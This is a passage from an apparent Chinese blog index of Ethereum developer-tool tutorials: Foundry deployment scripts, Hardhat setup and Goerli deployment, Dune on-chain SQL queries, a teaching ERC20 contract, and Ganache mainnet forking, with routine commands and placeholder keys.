vm.broadcast(); console2.log(\"run\"); } function someFunction(uint256 x) public { console2.log(\"some other func\"); console2.log(x); } } 指定方法，带参数的测试运行 forge script script/Counter.s.sol --sig=\"someFunction(uint256 x)\" 10 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:18:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"脚本部署合约 编写部署脚本： // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; // 引入合约 import \"../src/Counter.sol\"; contract CounterScript is Script { function setUp() public { console2.log(\"setup \"); } function run() public { vm.startBroadcast(); //生成合约对象 Counter c = new Counter(); vm.stopBroadcast(); } } 测试部署： forge script script/Counter.s.sol -vvvv --rpc-url=http://127.0.0.1:8545 正式部署： forge script script/Counter.s.sol -vvvv --rpc-url=http://127.0.0.1:8545 --broadcast --private-key=privete_key 部署完成之后会多一个broadcast文件夹，查看该文件夹有run-latest.json可以看到部署的相应信息。 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:19:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"部署多个网络 使用fork代码可以部署多个网络 uint256 mainnet = vm.createFork(rpc); ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:19:1","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"Tips： forge test --gas-report forge inspect # 对比gas是否减少 forge snapshot forge snapshot --diff # 交互式Debugger forge script script/Counter.s.sol --debug # 链上交易debugger forge run --debug ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:20:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"总结 介绍了以Solidity为中心的开发工具，并介绍了如何利用Foundry编译，部署，测试智能合约。由于Foundry的部署和测试脚本都是用Solidity编写，免去了开发者学习javascript的时间成本，并提供了更多练习Solidity的机会，推荐大家使用。 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:21:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"参考 使用 foundry 框架加速智能合约开发 cast Commands - Foundry Book https://twitter.com/wp__lai ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:22:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"Hardhat是以太坊最流行的开发环境，它可以帮你编译和部署智能合约，并且提供了Hardhat Network支持本地测试和运行Solidity。这一讲，我们将介绍如何安装Hardhat，使用Hardhat编写并编译合约，并运行简单的测试。 ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:0:0","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"Hardhat安装 ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:1:0","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"安装node 可以使用 nvm 安装node GitHub - nvm-sh/nvm: Node Version Manager - POSIX-compliant bash script to manage multiple active node.js versions ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:1:1","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"安装Hardhat 打开命令行工具，输入： mkdir hardhat-demo cd hardhat-demo npm init -y npm install --save-dev hardhat ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:1:2","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"创建Hardhat项目 打开命令行工具，输入： cd hardhat-demo npx hardhat 选择第三项：创建空白项目配置 Create an empty hardhat.config.js 👷 Welcome to Hardhat v2.9.9 👷‍ ? What do you want to do? … Create a JavaScript project Create a TypeScript project ❯ Create an empty hardhat.config.js Quit ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:1:3","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"安装插件 npm install --save-dev @nomicfoundation/hardhat-toolbox 将插件添加到你的hardhat配置文件中 hardhat.config.js require(\"@nomicfoundation/hardhat-toolbox\"); /** @type import('hardhat/config').HardhatUserConfig */ module.exports = { solidity: \"0.8.9\", }; ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:1:4","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"编写并编译合约 如果你用过remix，那么你直接在remix上点击保存的时候，会自动帮你编译的。但是在本地的hardhat开发环境中，你需要手动编译合约。 ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:2:0","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"新建合约目录 新建contracts合约目录，并添加第31章节的ERC20合约。 ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:2:1","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"编写合约 这里的合约直接使用ERC20合约: // SPDX-License-Identifier: MIT pragma solidity ^0.8.4; import \"./IERC20.sol\"; contract ERC20 is IERC20 { mapping(address =\u003e uint256) public override balanceOf; mapping(address =\u003e mapping(address =\u003e uint256)) public override allowance; uint256 public override totalSupply; // 代币总供给 string public name; // 名称 string public symbol; // 符号 uint8 public decimals = 18; // 小数位数 // @dev 在合约部署的时候实现合约名称和符号 constructor(string memory name_, string memory symbol_){ name = name_; symbol = symbol_; } // @dev 实现`transfer`函数，代币转账逻辑 function transfer(address recipient, uint amount) external override returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[recipient] += amount; emit Transfer(msg.sender, recipient, amount); return true; } // @dev 实现 `approve` 函数, 代币授权逻辑 function approve(address spender, uint amount) external override returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; } // @dev 实现`transferFrom`函数，代币授权转账逻辑 function transferFrom( address sender, address recipient, uint amount ) external override returns (bool) { allowance[sender][msg.sender] -= amount; balanceOf[sender] -= amount; balanceOf[recipient] += amount; emit Transfer(sender, recipient, amount); return true; } // @dev 铸造代币，从 `0` 地址转账给 调用者地址 function mint(uint amount) external { balanceOf[msg.sender] += amount; totalSupply += amount; emit Transfer(address(0), msg.sender, amount); } // @dev 销毁代币，从 调用者地址 转账给 `0` 地址 function burn(uint amount) external { balanceOf[msg.sender] -= amount; totalSupply -= amount; emit Transfer(msg.sender, address(0), amount); } } ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:2:2","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"编译合约 npx hardhat compile 看到如下输出，说明合约编译成功： Compiling 2 Solidity files successfully 成功后，你会在文件夹下看到artifacts目录，里面的json文件就是编译结果。 ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:2:3","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"编写单元测试 这里的单元测试非常简单，仅包含部署合约并测试合约地址是否合法（是否部署成功）。 新建测试文件夹test，在其中新建test.js。单元测试中，我们会用到chai和ethers.js两个库，分别用于测试和链上交互。更详细的单元测试框架还有chai和mocha。 const { expect } = require('chai'); const { ethers } = require('hardhat'); describe(\"ERC20 合约测试\", ()=\u003e{ it(\"合约部署\", async () =\u003e { // ethers.getSigners,代表eth账号 ethers 是一个全局函数，可以直接调用 const [owner, addr1, addr2] = await ethers.getSigners(); // ethers.js 中的 ContractFactory 是用于部署新智能合约的抽象，因此这里的 ERC20 是我们代币合约实例的工厂。ERC20代表contracts 文件夹中的 ERC20.sol 文件 const Token = await ethers.getContractFactory(\"ERC20\"); // 部署合约, 传入参数 ERC20.sol 中的构造函数参数分别是 name, symbol 这里我们都叫做WTF const hardhatToken = await Token.deploy(\"WTF\", \"WTF\"); // 获取合约地址 const ContractAddress = await hardhatToken.address; expect(ContractAddress).to.properAddress; }); }) ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:3:0","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"运行测试 在命令行输入以下内容运行测试： npx hardhat test # 如果有多个文件想跑指定文件可以使用 npx mocha test/test.js 看到如下输出，说明测试成功。 ERC20 合约测试 ✔ 合约部署 (1648ms) 1 passing (2s) ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:4:0","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"部署合约 在remix中，我们只需要点击一下deploy就可以部署合约了，但是在本地hardhat中，我们需要编写一个部署脚本。 新建一个scripts文件夹，我们来编写部署合约脚本。并在该目录下新建一个deploy.js 输入以下代码 // 我们可以通过 npx hardhat run \u003cscript\u003e 来运行想要的脚本 // 这里你可以使用 npx hardhat run deploy.js 来运行 const hre = require(\"hardhat\"); async function main() { const Contract = await hre.ethers.getContractFactory(\"ERC20\"); const token = await Contract.deploy(\"WTF\",\"WTF\"); await token.deployed(); console.log(\"成功部署合约:\", token.address); } // 运行脚本 main().catch((error) =\u003e { console.error(error); process.exitCode = 1; }); 运行以下代码部署合约到本地测试网络 hardhat会提供一个默认的网络，参考：hardhat默认网络 npx hardhat run --network hardhat scripts/deploy.js 看到如下输出，说明合约部署成功： (node:45779) ExperimentalWarning: stream/web is an experimental feature. This feature could change at any time (Use `node --trace-warnings ...` to show where the warning was created) 成功部署合约: 0x5FbDB2315678afecb367f032d93F642f64180aa3 ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:5:0","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"部署合约到Goerli测试网络 ｜ 网络配置 ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:6:0","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"前期准备 申请alchemy的api key 申请Goerli测试代币 点击申请 登录alchemy账号每天可以领取0.2个代币 导出私钥 因为需要把合约部署到Goerli测试网络，所以该测试账号中留有一定的测试代币。导出已有测试代币的账户的私钥，用于部署合约 ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:6:1","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"配置网络 在hardhat.config.js中，我们可以配置多个网络，这里我们配置Goerli测试网络。 编辑 hardhat.config.js require(\"@nomicfoundation/hardhat-toolbox\"); // 申请alchemy的api key const ALCHEMY_API_KEY = \"KEY\"; //将此私钥替换为测试账号私钥 //从Metamask导出您的私钥，打开Metamask和进入“帐户详细信息”\u003e导出私钥 //注意:永远不要把真正的以太放入测试帐户 const GOERLI_PRIVATE_KEY = \"YOUR GOERLI PRIVATE KEY\"; module.exports = { solidity: \"0.8.9\", // solidity的编译版本 networks: { goerli: { url: `https://eth-goerli.alchemyapi.io/v2/${ALCHEMY_API_KEY}`, accounts: [GOERLI_PRIVATE_KEY] } } }; 配置完成运行 npx hardhat run --network goerli scripts/deploy.js 你就可以把你的合约部署到Goerli测试网络了。 看到如下信息，你就成功部署到Goerli测试网络了。 (node:46996) ExperimentalWarning: stream/web is an experimental feature. This feature could change at any time (Use `node --trace-warnings ...` to show where the warning was created) (node:46999) ExperimentalWarning: stream/web is an experimental feature. This feature could change at any time (Use `node --trace-warnings ...` to show where the warning was created) 成功部署合约: 0xeEAcef71084Dd1Ae542***9D8F64E3c68e15**** 可以通过etherscan查看合约部署情况 同理你也可以配置多个网络，比如mainnet，rinkeby等。 ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:6:2","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"总结 介绍了Hardhat基础用法。通过Hardhat我们能够工程化solidity的项目，并提供了很多有用的脚手架。在后续的文章中，我们会介绍更多的Hardhat的高级用法，例如使用Hardhat的插件、测试框架等等。 ","date":"2022-05-27","objectID":"/posts/tools-hardhat-introduce.html:7:0","tags":["tools"],"title":"Hardhat以太坊开发环境","uri":"/posts/tools-hardhat-introduce.html"},{"categories":["工具"],"content":"Dune是什么？ Dune是区块链查询分析工具，每个人可以通过写类sql语言查询区块链上的所有信息，例如巨鲸，链上交易的数据等等。同时Dune能便捷的将数据转换为可视化的图表。 以太坊是数据库，智能合约是数据表，来自钱包的交易是每个表中的行。 这句话讲出了区块链的精髓：区块链本质上就是公开的存储数据的分布式账本，现在我们可以通过Dune来查询这个分布式账本的数据。 Dune官网 ","date":"2022-05-16","objectID":"/posts/tools-dune-introduce.html:1:0","tags":["tools"],"title":"使用Dune可视化区块链数据","uri":"/posts/tools-dune-introduce.html"},{"categories":["工具"],"content":"第一个查询 目标：查询过去 24 小时在 Uniswap 上购买的 DAI稳定币 注册登陆Dune。 点击右上角new query新建查询，输入代码： SELECT SUM(token_a_amount) AS dai_bought FROM dex.\"trades\" WHERE block_time \u003e now() - interval '24 hours' AND token_a_symbol = 'DAI' AND project = 'Uniswap'; 点击右下角的Run执行查询，得到最近的24h内通过uniswap购买DAI的的数量。 ","date":"2022-05-16","objectID":"/posts/tools-dune-introduce.html:2:0","tags":["tools"],"title":"使用Dune可视化区块链数据","uri":"/posts/tools-dune-introduce.html"},{"categories":["工具"],"content":"从0开始构建查询 目标：学会使用 SELECT, WHERE, LIMIT 我们查询其中一个表，以aave为例：aave合约 通过查询aave这个合约，它有deposit（存储）这个方法，并且有该事件（事件会在执行的时候广播）。 回到Dune查找对应的表，根据在Ethereum上搜索aave相关的表，并对应事件,LendingPool_evt_Deposit找到该表。 ","date":"2022-05-16","objectID":"/posts/tools-dune-introduce.html:3:0","tags":["tools"],"title":"使用Dune可视化区块链数据","uri":"/posts/tools-dune-introduce.html"},{"categories":["工具"],"content":"学习：SELECT 、 LIMIT、WHERE查询数据 然后我们通过Dune可以查询对应的存储数据 SELECT * FROM aave.\"LendingPool_evt_Deposit\" limit 100 就可以得到aave合约中存储方法的相应数据，通过这个数据可以做一些筛选 各个字段的意义 _user：发起存款的钱包地址 _reserve：作为抵押品存放的代币地址 _amount：存入的代币数量 _timestamp：交易被挖掘到区块链的时间戳 使用 WHERE过滤数据 查询过滤特殊的地址0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee SELECT *, (_amount / 1e18) as _amount FROM aave.\"LendingPool_evt_Deposit\" WHERE _reserve = '\\xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee' limit 100 带上了查询条件，能够快速的筛选我们需要的数据 查看抵押品为USDC，USDC合约地址：xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 SELECT * FROM aave.\"LendingPool_evt_Deposit\" WHERE _reserve = '\\xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48' limit 100 以上案例参考 Your guide to basic SQL while learning Ethereum at the same time ","date":"2022-05-16","objectID":"/posts/tools-dune-introduce.html:3:1","tags":["tools"],"title":"使用Dune可视化区块链数据","uri":"/posts/tools-dune-introduce.html"},{"categories":["工具"],"content":"实践链上转账 实践Ethereum.Transactions表的转账查询 select * from ethereum.transactions LIMIT 10 ","date":"2022-05-16","objectID":"/posts/tools-dune-introduce.html:3:2","tags":["tools"],"title":"使用Dune可视化区块链数据","uri":"/posts/tools-dune-introduce.html"},{"categories":["工具"],"content":"字段和转账对应说明 看这个hash转账 由0x22fff189c37302c02635322911c3b64f80ce7203 转账到 0x8aae242452471d2dfea145214ceedf87ca043198 hash：0xfa69f5eb0218f56ae602ef7f01588d9193a891e6fe7ba7e1c3994075a689bb51 我们可以直接通过dune查到该条信息 select * from ethereum.transactions WHERE hash='\\xfa69f5eb0218f56ae602ef7f01588d9193a891e6fe7ba7e1c3994075a689bb51' dune中的字段，也是和etherscan中一一对应。 ","date":"2022-05-16","objectID":"/posts/tools-dune-introduce.html:3:3","tags":["tools"],"title":"使用Dune可视化区块链数据","uri":"/posts/tools-dune-introduce.html"},{"categories":["工具"],"content":"数据可视化 点击 New visualization 就可以选择你需要的视图，比如我点击 bar chart 就会将我刚才筛选的数据可视化。看最长的几根，就是借贷最多的几个账号。 ","date":"2022-05-16","objectID":"/posts/tools-dune-introduce.html:3:4","tags":["tools"],"title":"使用Dune可视化区块链数据","uri":"/posts/tools-dune-introduce.html"},{"categories":["工具"],"content":"总结 通过Dune，我们能够将链上的数据转换为可视化的数据，更好的了解链上热点。 ","date":"2022-05-16","objectID":"/posts/tools-dune-introduce.html:4:0","tags":["tools"],"title":"使用Dune可视化区块链数据","uri":"/posts/tools-dune-introduce.html"},{"categories":["基础知识","Solidity 应用"],"content":"ERC20 ERC20是以太坊上的代币标准，来自2015年11月V神参与的EIP20。它实现了代币转账的基本逻辑： 账户余额 转账 授权转账 代币总供给 代币信息（可选）：名称，代号，小数位数 ","date":"2022-05-15","objectID":"/posts/solidity-erc20.html:1:0","tags":["solidity","basic"],"title":"以太坊ERC20代币标准","uri":"/posts/solidity-erc20.html"},{"categories":["基础知识","Solidity 应用"],"content":"IERC20 IERC20是ERC20代币标准的接口合约，规定了ERC20代币需要实现的函数和事件。 之所以需要定义接口，是因为有了规范后，就存在所有的ERC20代币都通用的函数名称，输入参数，输出参数。 在接口函数中，只需要定义函数名称，输入参数，输出参数，并不关心函数内部如何实现。 由此，函数就分为内部和外部两个内容，一个重点是实现，另一个是对外接口，约定共同数据。 这就是为什么需要ERC20.sol和IERC20.sol两个文件实现一个合约。 ","date":"2022-05-15","objectID":"/posts/solidity-erc20.html:2:0","tags":["solidity","basic"],"title":"以太坊ERC20代币标准","uri":"/posts/solidity-erc20.html"},{"categories":["基础知识","Solidity 应用"],"content":"事件 IERC20定义了2个事件：Transfer事件和Approval事件，分别在转账和授权时被释放 /** * @dev 释放条件：当 `value` 单位的货币从账户 (`from`) 转账到另一账户 (`to`)时. */ event Transfer(address indexed from, address indexed to, uint256 value); /** * @dev 释放条件：当 `value` 单位的货币从账户 (`owner`) 授权给另一账户 (`spender`)时. */ event Approval(address indexed owner, address indexed spender, uint256 value); ","date":"2022-05-15","objectID":"/posts/solidity-erc20.html:2:1","tags":["solidity","basic"],"title":"以太坊ERC20代币标准","uri":"/posts/solidity-erc20.html"},{"categories":["基础知识","Solidity 应用"],"content":"函数 IERC20定义了6个函数，提供了转移代币的基本功能，并允许代币获得批准，以便其他链上第三方使用。 totalSupply()返回代币总供给 /** * @dev 返回代币总供给. */ function totalSupply() external view returns (uint256); balanceOf()返回账户余额 /** * @dev 返回账户`account`所持有的代币数. */ function balanceOf(address account) external view returns (uint256); transfer()转账 /** * @dev 转账 `amount` 单位代币，从调用者账户到另一账户 `to`. * * 如果成功，返回 `true`. * * 释放 {Transfer} 事件. */ function transfer(address to, uint256 amount) external returns (bool); allowance()返回授权额度 /** * @dev 返回`owner`账户授权给`spender`账户的额度，默认为0。 * * 当{approve} 或 {transferFrom} 被调用时，`allowance`会改变. */ function allowance(address owner, address spender) external view returns (uint256); approve()授权 /** * @dev 调用者账户给`spender`账户授权 `amount`数量代币。 * * 如果成功，返回 `true`. * * 释放 {Approval} 事件. */ function approve(address spender, uint256 amount) external returns (bool); transferFrom()授权转账 /** * @dev 通过授权机制，从`from`账户向`to`账户转账`amount`数量代币。转账的部分会从调用者的`allowance`中扣除。 * * 如果成功，返回 `true`. * * 释放 {Transfer} 事件. */ function transferFrom( address from, address to, uint256 amount ) external returns (bool); ","date":"2022-05-15","objectID":"/posts/solidity-erc20.html:2:2","tags":["solidity","basic"],"title":"以太坊ERC20代币标准","uri":"/posts/solidity-erc20.html"},{"categories":["基础知识","Solidity 应用"],"content":"实现ERC20 现在我们写一个ERC20，将IERC20规定的函数简单实现。 ","date":"2022-05-15","objectID":"/posts/solidity-erc20.html:3:0","tags":["solidity","basic"],"title":"以太坊ERC20代币标准","uri":"/posts/solidity-erc20.html"},{"categories":["基础知识","Solidity 应用"],"content":"状态变量 我们需要状态变量来记录账户余额，授权额度和代币信息。其中balanceOf, allowance和totalSupply为public类型，会自动生成一个同名getter函数，实现IERC20规定的balanceOf(), allowance()和totalSupply()。而name, symbol, decimals则对应代币的名称，代号和小数位数。 注意：用override修饰public变量，会重写继承自父合约的与变量同名的getter函数，比如IERC20中的balanceOf()函数。 mapping(address =\u003e uint256) public override balanceOf; mapping(address =\u003e mapping(address =\u003e uint256)) public override allowance; uint256 public override totalSupply; // 代币总供给 string public name; // 名称 string public symbol; // 代号 uint8 public decimals = 18; // 小数位数 ","date":"2022-05-15","objectID":"/posts/solidity-erc20.html:3:1","tags":["solidity","basic"],"title":"以太坊ERC20代币标准","uri":"/posts/solidity-erc20.html"},{"categories":["基础知识","Solidity 应用"],"content":"函数 构造函数：初始化代币名称、代号。 constructor(string memory name_, string memory symbol_){ name = name_; symbol = symbol_; } transfer()函数：实现IERC20中的transfer函数，代币转账逻辑。调用方扣除amount数量代币，接收方增加相应代币。土狗币会魔改这个函数，加入税收、分红、抽奖等逻辑。 function transfer(address recipient, uint amount) external override returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[recipient] += amount; emit Transfer(msg.sender, recipient, amount); return true; } approve()函数：实现IERC20中的approve函数，代币授权逻辑。被授权方spender可以支配授权方的amount数量的代币。spender可以是EOA账户，也可以是合约账户：当你用uniswap交易代币时，你需要将代币授权给uniswap合约。 function approve(address spender, uint amount) external override returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; } transferFrom()函数：实现IERC20中的transferFrom函数，授权转账逻辑。被授权方将授权方sender的amount数量的代币转账给接收方recipient。 function transferFrom( address sender, address recipient, uint amount ) external override returns (bool) { allowance[sender][msg.sender] -= amount; balanceOf[sender] -= amount; balanceOf[recipient] += amount; emit Transfer(sender, recipient, amount); return true; } mint()函数：铸造代币函数，不在IERC20标准中。这里为了教程方便，任何人可以铸造任意数量的代币，实际应用中会加权限管理，只有owner可以铸造代币： function mint(uint amount) external { balanceOf[msg.sender] += amount; totalSupply += amount; emit Transfer(address(0), msg.sender, amount); } burn()函数：销毁代币函数，不在IERC20标准中。 function burn(uint amount) external { balanceOf[msg.sender] -= amount; totalSupply -= amount; emit Transfer(msg.sender, address(0), amount); } ","date":"2022-05-15","objectID":"/posts/solidity-erc20.html:3:2","tags":["solidity","basic"],"title":"以太坊ERC20代币标准","uri":"/posts/solidity-erc20.html"},{"categories":["基础知识","Solidity 应用"],"content":"发行ERC20代币 有了ERC20标准后，在ETH链上发行代币变得非常简单。现在，我们发行属于我们的第一个代币。 在Remix上编译好ERC20合约，在部署栏输入构造函数的参数，name_和symbol_都设为BLOG，然后点击transact键进行部署。 这样，我们就创建好了BLOG代币。我们需要运行mint()函数来给自己铸造一些代币。点开Deployed Contract中的ERC20合约，在mint函数那一栏输入100并点击mint按钮，为自己铸造100个BLOG代币。 可以点开右侧的Debug按钮，具体查看下面的logs。 里面包含四个关键信息： 事件Transfer 铸币地址0x0000000000000000000000000000000000000000 接收地址0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 代币数额100 我们利用balanceOf()函数来查询账户余额。输入我们当前的账户，可以看到余额变为100，铸造成功。 账户信息如图左侧，右侧标注为函数执行的具体信息。 ","date":"2022-05-15","objectID":"/posts/solidity-erc20.html:4:0","tags":["solidity","basic"],"title":"以太坊ERC20代币标准","uri":"/posts/solidity-erc20.html"},{"categories":["基础知识","Solidity 应用"],"content":"总结 2015年底提出的ERC20代币标准极大的降低了以太坊上发行代币的门槛，并开启了ICO大时代。在投资时，仔细阅读项目的代币合约，可以有效避开貔貅，增加投资成功率。 ","date":"2022-05-15","objectID":"/posts/solidity-erc20.html:5:0","tags":["solidity","basic"],"title":"以太坊ERC20代币标准","uri":"/posts/solidity-erc20.html"},{"categories":["工具"],"content":" 引言 Infura是Consensys(小狐狸钱包母公司)开发的区块链基础设施，帮助用户/开发者更好的与以太坊区块链交互。 Ganache 是一个适用于 “开发场景”（或开发过程中的）的 以太坊区块链网络，它使开发以太坊应用程序（的工作）更快、更容易、更安全。它包括所有流行的 RPC 功能和特性（如事件），并且可以确定性地运行以使开发变得轻而易举。 可以理解 ganache 是一个以太坊区块链“模拟器”，在开发过程中 “模拟” 生产环境、方便的获取合约调用的上下文。 ⚠️ 注意：请不要在生产环境中作为区块链网络使用 如果需要请使用 geth 或 openethereum 等节点应用。 Ganache 同时有着 GUI 版本，适合于新手快速配置使用。 ","date":"2022-04-13","objectID":"/posts/tools-ganache-introduce.html:0:0","tags":["tools"],"title":"Ganache，搭建本地测试网络","uri":"/posts/tools-ganache-introduce.html"},{"categories":["工具"],"content":"Ganache 的项目设施 官网：https://trufflesuite.com/ganache/ 文档：https://trufflesuite.com/docs/ganache/ Github： UI: https://github.com/trufflesuite/ganache-ui CLI: https://github.com/trufflesuite/ganache 旧版（已弃用）: https://github.com/trufflesuite/ganache-cli 适用于命令行/npm的文档：https://trufflesuite.com/blog/introducing-ganache-7/ ⚠️ 注意：Ganache 的官网中的 Github repo 为UI版本。CLI 版本在 npm 中有 ganache \u0026 ganache-cli，其中 ganache-cli 已被弃用。 ","date":"2022-04-13","objectID":"/posts/tools-ganache-introduce.html:1:0","tags":["tools"],"title":"Ganache，搭建本地测试网络","uri":"/posts/tools-ganache-introduce.html"},{"categories":["工具"],"content":"为什么要使用Ganache？ Ganache 的主要功能有： 开箱即用，快速启动一个EVM区块链网络（可以设置 miner、出块时间）； 方便的 fork（分叉）已经存在的区块链网络（无需等待区块同步）； 使用 console.log 在 Solidity 开发过程中方便的调试，； 快进时间（Fast-forward time），模拟智能合约在未来时间的状态； 模拟任何一个账户（你可以无需私钥模拟环境中使用任意用户的Token）； 有的时候想要实现合约的测试，或者一些合约开发，你需要去测试网领取eth。有时候faucet又没有eth可以领取，这个时候，其实你可以选择自己在本地 fork 一个网络，想要多少eth都可以直接生成。原理是 fork 一个主网的网络运行在本地（或是可以称作运行在本地的 Chain）。 fork主网还有一个好处，你可以直接mock现在主网上的所有环境，比如dex交易所的代币余额等，你知道合约地址，可以直接进行测试和交换使用等。 ","date":"2022-04-13","objectID":"/posts/tools-ganache-introduce.html:2:0","tags":["tools"],"title":"Ganache，搭建本地测试网络","uri":"/posts/tools-ganache-introduce.html"},{"categories":["工具"],"content":"命令行安装（推荐） 完整包的说明 ganache - npm npm install ganache --global 您也可以单独安装该项至您的项目目录（在不使用 --global 的情况下）编写 package.json 中的 script 配置启动。 在 Ganache 7 后您可以在 node.js 的 Javascript 脚本中引入并直接使用。它将会提供一个 EIP-1193(Ethereum Provider JavaScript API) provider、一个 JSON-RPC 服务端、Web3.js \u0026 ethers provider。同时您也可以在浏览器中使用它。 ","date":"2022-04-13","objectID":"/posts/tools-ganache-introduce.html:3:0","tags":["tools"],"title":"Ganache，搭建本地测试网络","uri":"/posts/tools-ganache-introduce.html"},{"categories":["工具"],"content":"启动GANACHE ganache ","date":"2022-04-13","objectID":"/posts/tools-ganache-introduce.html:3:1","tags":["tools"],"title":"Ganache，搭建本地测试网络","uri":"/posts/tools-ganache-introduce.html"},{"categories":["工具"],"content":"帮助 / 说明 ganache --help 通过帮助，你可以了解 ganache 的主要功能和相关配置方法、参数。这其中包括： Chain: 设置网络的版本、ID、时间、合约大小限制、hardfork的版本规则； Database: 设置保存链到数据库； Logging: 设置 EVM opcodes、RPC 请求和响应的 log； Miner: 设置矿工，包括：出块时间、默认的 gas price、Txn gas limit、难度、instamine、价格上涨； Wallet: 设置钱包的默认余额、解锁钱包； Fork: 分叉（fork）网络的设置包括：fork 目标网络 RPC URL、块高、userAgent、缓存策略，支持提供用户名/密码（如果目标 RPC 存在 Basic Authentication）； Server: 设置本地 Chain 的监听地址\u0026端口； ","date":"2022-04-13","objectID":"/posts/tools-ganache-introduce.html:3:2","tags":["tools"],"title":"Ganache，搭建本地测试网络","uri":"/posts/tools-ganache-introduce.html"},{"categories":["工具"],"content":"Fork 主网启动 以下命令会自动生成10个eth账号，每个账号带有100eth的数量。 ganache -f https://eth-mainnet.alchemyapi.io/v2/YOUR_API_KEY 您也可以fork其他以太坊区块链网络，例如 BSC、Polygon、Astar 等，您需要寻找并使用他们的RPC节点。 ","date":"2022-04-13","objectID":"/posts/tools-ganache-introduce.html:3:3","tags":["tools"],"title":"Ganache，搭建本地测试网络","uri":"/posts/tools-ganache-introduce.html"},{"categories":["工具"],"content":"Fork主网固定账号启动 wallet.accounts主要参数为私钥和需要生成的eth数量。 注意单位为wei，案例中换算之后是1000eth ganache -f https://eth-mainnet.alchemyapi.io/v2/YOUR_API_KEY --wallet.accounts=ACCOUNT_PRIATE_KEY,AMOUNT_WEI --wallet.accounts=ACCOUNT_PRIATE_KEY,1000000000000000000000 ","date":"2022-04-13","objectID":"/posts/tools-ganache-introduce.html:3:4","tags":["tools"],"title":"Ganache，搭建本地测试网络","uri":"/posts/tools-ganache-introduce.html"},{"categories":["工具"],"content":"推进时间 (Fast Forward time) 需要操纵时间的原因或场景：一些合约锁住了用户的Token，设计了释放周期/时间逐步释放这些被锁住的Token，或者在未来某个特定时间允许用户进行一些操作。 Ganache 允许我们通过 RPC 调用（方法 